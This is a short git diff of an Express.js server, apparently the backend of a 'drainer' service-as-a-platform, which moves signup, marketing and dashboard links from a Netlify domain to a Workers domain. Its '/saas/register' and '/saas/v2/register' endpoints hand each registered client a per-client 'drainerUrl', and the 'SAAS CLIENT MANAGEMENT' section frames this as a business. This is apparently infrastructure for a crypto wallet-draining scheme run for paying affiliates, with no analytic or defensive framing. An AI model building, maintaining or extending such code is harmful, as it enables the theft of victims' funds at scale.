@@ -53,12 +53,12 @@ app.get("/", (req, res) => {
       panel: "GET /panel",
       health: "GET /health"
     },
-    marketing: "https://service-cheetah.netlify.app/"
+    marketing: "https://ch.xqx.workers.dev/"
   });
 });
 
 app.get("/signup", (req, res) => {
-  res.redirect("https://service-cheetah.netlify.app/");
+  res.redirect("https://ch.xqx.workers.dev/");
 });
 
 // ==================== SAAS CLIENT MANAGEMENT ====================
@@ -108,7 +108,7 @@ app.post('/saas/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-  dashboardUrl: `https://service-cheetah.netlify.app/dashboard.html?client=${clientId}`,
+  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
   message: 'Client registered successfully'
 });
     
@@ -195,7 +195,7 @@ app.post('/saas/v2/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-  dashboardUrl: `https://service-cheetah.netlify.app/dashboard.html?client=${clientId}`,
+  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
   message: 'Client registered successfully'
 });
     
